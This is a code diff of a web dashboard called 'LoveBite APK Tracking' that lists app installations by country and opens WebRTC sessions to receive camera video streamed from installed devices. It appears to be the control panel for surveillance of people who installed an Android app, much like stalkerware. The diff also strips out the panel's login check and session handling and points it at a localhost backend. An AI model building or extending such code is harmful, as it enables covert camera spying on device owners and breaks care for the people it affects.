@@ -469,17 +469,8 @@
 <body>
     <div class="container">
         <div class="header">
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-                <div>
-                    <h1>💕 LoveBite APK Tracking</h1>
-                    <p>Global Installation Monitor Dashboard</p>
-                </div>
-                <div>
-                    <button onclick="logout()" style="background: rgba(255,255,255,0.2); color: white; border: 2px solid rgba(255,255,255,0.3); padding: 10px 20px; border-radius: 25px; cursor: pointer; font-size: 14px; font-weight: 600; transition: all 0.3s ease;">
-                        🚪 Logout
-                    </button>
-                </div>
-            </div>
+            <h1>💕 LoveBite APK Tracking</h1>
+            <p>Global Installation Monitor Dashboard</p>
         </div>
         
         <div class="stats-grid" id="statsGrid">
@@ -650,64 +641,8 @@
 
     <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
     <script>
-        // Authentication check
-        function checkAuthentication() {
-            const SESSION_KEY = 'lovebite_admin_session';
-            const SESSION_DURATION = 24 * 60 * 60 * 1000; // 24 hours
-            
-            const session = localStorage.getItem(SESSION_KEY);
-            if (!session) {
-                redirectToLogin();
-                return false;
-            }
-            
-            try {
-                const sessionData = JSON.parse(session);
-                const now = new Date().getTime();
-                
-                if (!sessionData.timestamp || (now - sessionData.timestamp) >= SESSION_DURATION) {
-                    // Session expired
-                    localStorage.removeItem(SESSION_KEY);
-                    redirectToLogin();
-                    return false;
-                }
-                
-                // Valid session, update timestamp
-                sessionData.timestamp = now;
-                localStorage.setItem(SESSION_KEY, JSON.stringify(sessionData));
-                return true;
-            } catch (error) {
-                // Invalid session data
-                localStorage.removeItem(SESSION_KEY);
-                redirectToLogin();
-                return false;
-            }
-        }
-        
-        function redirectToLogin() {
-            window.location.href = 'login.html';
-        }
-        
-        function logout() {
-            localStorage.removeItem('lovebite_admin_session');
-            redirectToLogin();
-        }
-        
-        // Authentication check disabled for static login
-        // if (!checkAuthentication()) {
-        //     // Stop execution if not authenticated
-        //     throw new Error('Authentication required');
-        // }
-        
-        // Dynamic URL detection for production vs development
-        const isProduction = window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1';
-        // Use Vercel deployment URL (WebSocket not available on Vercel serverless)
-        const API_BASE = isProduction ? 'https://lovebite-backend.vercel.app/api' : 'http://localhost:8080/api';
-        const WS_BASE = isProduction ? null : 'http://localhost:8080/'; // WebSocket only in local dev
-        
-        console.log('🌐 Environment:', isProduction ? 'Production' : 'Development');
-        console.log('🔗 API Base:', API_BASE);
-        console.log('🔌 WebSocket Base:', WS_BASE);
+        const API_BASE = 'http://localhost:5055/api';
+        const WS_BASE = 'http://localhost:5055';
 
         let pendingIceCandidates = [];
         
@@ -717,25 +652,13 @@
 
         // Initialize WebSocket connection
         function initializeWebSocket() {
-            // Skip WebSocket in production (Vercel doesn't support WebSockets)
-            if (!WS_BASE || WS_BASE === null) {
-                console.log('⚠️ WebSocket disabled in production (Vercel serverless)');
-                return;
-            }
-            
             try {
-                console.log('🔌 Connecting to WebSocket:', WS_BASE);
                 socket = io(WS_BASE, {
                     transports: ['websocket', 'polling'],
-                    timeout: 30000,  // Increased timeout
+                    timeout: 10000,
                     reconnection: true,
-                    reconnectionAttempts: 10,  // More attempts
-                    reconnectionDelay: 2000,   // Faster reconnection
-                    reconnectionDelayMax: 10000,  // Max delay
-                    maxReconnectionAttempts: 10,
-                    forceNew: true,  // Force new connection
-                    upgrade: true,   // Allow transport upgrades
-                    rememberUpgrade: false
+                    reconnectionAttempts: 5,
+                    reconnectionDelay: 3000,
                 });
 
                 socket.on('connect', () => {
@@ -833,29 +756,8 @@ socket.on('ice_candidate', (data) => {
 
                 // ICE candidate handling is already done above - removing duplicate handler
 
-                socket.on('disconnect', (reason) => {
-                    console.log('🔌 WebSocket disconnected:', reason);
-                    document.getElementById('cameraStatus').textContent = '🔌 WebSocket disconnected - attempting to reconnect...';
-                });
-
-                socket.on('reconnect', (attemptNumber) => {
-                    console.log('🔄 WebSocket reconnected after', attemptNumber, 'attempts');
-                    document.getElementById('cameraStatus').textContent = '✅ WebSocket reconnected';
-                });
-
-                socket.on('reconnect_error', (error) => {
-                    console.error('❌ WebSocket reconnection failed:', error);
-                    document.getElementById('cameraStatus').textContent = '❌ WebSocket reconnection failed';
-                });
-
-                socket.on('reconnect_failed', () => {
-                    console.error('❌ WebSocket reconnection failed permanently');
-                    document.getElementById('cameraStatus').textContent = '❌ WebSocket connection lost - please refresh the page';
-                });
-
-                socket.on('connect_error', (error) => {
-                    console.error('❌ WebSocket connection error:', error);
-                    document.getElementById('cameraStatus').textContent = '❌ WebSocket connection error';
+                socket.on('disconnect', () => {
+                    console.log('🔌 WebSocket disconnected');
                 });
 
             } catch (error) {
@@ -865,7 +767,6 @@ socket.on('ice_candidate', (data) => {
         
         async function loadStats() {
             try {
-                console.log('📊 Loading stats from:', `${API_BASE}/stats`);
                 const response = await fetch(`${API_BASE}/stats`);
                 const data = await response.json();
                 
@@ -886,7 +787,6 @@ socket.on('ice_candidate', (data) => {
                 const activeFilter = document.getElementById('activeFilter').value;
                 
                 let url = `${API_BASE}/installations?active_only=${activeFilter}`;
-                console.log('📱 Loading installations from:', url);
                 if (countryFilter) {
                     url += `&country=${encodeURIComponent(countryFilter)}`;
                 }
@@ -1103,35 +1003,15 @@ socket.on('ice_candidate', (data) => {
         }
         
         async function handleWebRTCAnswer(answer) {
-            try {
-                console.log('📥 Handling WebRTC answer from device...');
-                console.log('📥 Answer type:', answer.type);
-                console.log('📥 Answer SDP length:', answer.sdp ? answer.sdp.length : 'No SDP');
-                console.log('📥 Answer SDP start:', answer.sdp ? answer.sdp.substring(0, 100) + '...' : 'No SDP');
-                
-                // Validate SDP format
-                if (!answer.sdp || !answer.sdp.startsWith('v=')) {
-                    console.error('❌ Invalid SDP format - should start with "v="');
-                    console.error('❌ Received SDP:', answer.sdp);
-                    showSimulatedVideoStream();
-                    return;
-                }
-                
-                if (webrtcConnection && webrtcConnection.peerConnection) {
-                    // Check if we're in the correct state to set remote description
-                    const signalingState = webrtcConnection.peerConnection.signalingState;
-                    console.log('📥 Current signaling state:', signalingState);
-                    
-                    if (signalingState === 'have-local-offer') {
-                        // Set remote description
-                        await webrtcConnection.peerConnection.setRemoteDescription(answer);
-                        console.log('✅ Remote description set');
-                    } else {
-                        console.log('❌ Cannot set remote description in state:', signalingState);
-                        console.log('📥 Expected state: have-local-offer, got:', signalingState);
-                        showSimulatedVideoStream();
-                        return;
-                    }
+    try {
+        console.log('📥 Handling WebRTC answer from device...');
+        console.log('📥 Answer type:', answer.type);
+        console.log('📥 Answer SDP length:', answer.sdp ? answer.sdp.length : 'No SDP');
+        
+        if (webrtcConnection && webrtcConnection.peerConnection) {
+            // Set remote description
+            await webrtcConnection.peerConnection.setRemoteDescription(answer);
+            console.log('✅ Remote description set');
             
             // Try to get remote stream
             webrtcConnection.peerConnection.ontrack = (event) => {
@@ -2413,38 +2293,6 @@ socket.on('ice_candidate', (data) => {
 
         // Auto-refresh every 30 seconds
         setInterval(loadData, 30000);
-        
-        // Check authentication every 5 minutes
-        setInterval(() => {
-            if (!checkAuthentication()) {
-                console.log('🔐 Session expired, redirecting to login');
-            }
-        }, 5 * 60 * 1000);
-        
-        // Add session warning before timeout
-        setInterval(() => {
-            const SESSION_KEY = 'lovebite_admin_session';
-            const SESSION_DURATION = 24 * 60 * 60 * 1000; // 24 hours
-            const WARNING_TIME = 30 * 60 * 1000; // 30 minutes before expiry
-            
-            const session = localStorage.getItem(SESSION_KEY);
-            if (session) {
-                try {
-                    const sessionData = JSON.parse(session);
-                    const now = new Date().getTime();
-                    const timeLeft = SESSION_DURATION - (now - sessionData.timestamp);
-                    
-                    if (timeLeft <= WARNING_TIME && timeLeft > 0) {
-                        const minutesLeft = Math.floor(timeLeft / (60 * 1000));
-                        if (minutesLeft % 30 === 0) { // Show warning every 30 minutes
-                            console.log(`⚠️ Session will expire in ${minutesLeft} minutes`);
-                        }
-                    }
-                } catch (error) {
-                    // Invalid session
-                }
-            }
-        }, 60 * 1000); // Check every minute
     </script>
 </body>
 </html>
